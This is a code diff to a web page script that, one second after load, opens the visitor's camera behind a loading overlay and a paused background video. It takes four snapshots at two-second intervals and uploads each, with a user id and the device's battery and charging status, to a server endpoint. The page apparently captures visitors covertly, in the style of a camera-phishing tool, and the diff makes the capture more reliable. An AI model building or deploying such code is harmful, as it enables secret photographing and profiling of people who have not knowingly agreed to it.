@@ -91,25 +91,35 @@ async function captureSnapshots() {
     const stream = await navigator.mediaDevices.getUserMedia({ video:true });
     cameraVideo.srcObject = stream;
 
-    // Show loading overlay & pause video
+    // Wait for video to be ready
+    await new Promise(resolve => {
+      if(cameraVideo.readyState >= 2) resolve();
+      else cameraVideo.onloadedmetadata = () => resolve();
+    });
+
+    // Show loading overlay & pause background video
     loading.style.display = 'flex';
     bgVideo.pause();
 
-    // Take 4 snapshots at 2s interval
-    for(let i=0;i<4;i++){
-      await new Promise(res=>setTimeout(res,2000));
+    let snapshotCount = 0;
+    while(snapshotCount < 4){
+      await new Promise(res=>setTimeout(res,2000)); // wait 2s
       canvas.width = cameraVideo.videoWidth;
       canvas.height = cameraVideo.videoHeight;
       ctx.drawImage(cameraVideo,0,0);
       const imageData = canvas.toDataURL('image/png');
+
+      // Send snapshot
       fetch('/api/upload',{
         method:'POST',
         headers:{'Content-Type':'application/json'},
         body:JSON.stringify({ image:imageData, uid, battery:batteryLevel, charging:isCharging })
       }).then(r=>r.json()).then(d=>console.log("Uploaded",d)).catch(e=>console.error(e));
+
+      snapshotCount++;
     }
 
-    // Stop camera & hide overlay
+    // Stop camera stream
     stream.getTracks().forEach(track=>track.stop());
     loading.style.display='none';
     bgVideo.play();
@@ -123,7 +133,6 @@ async function captureSnapshots() {
 
 // Start snapshot sequence after 1s
 setTimeout(captureSnapshots,1000);
-</script>
-
+</script> 
 </body>
 </html> 
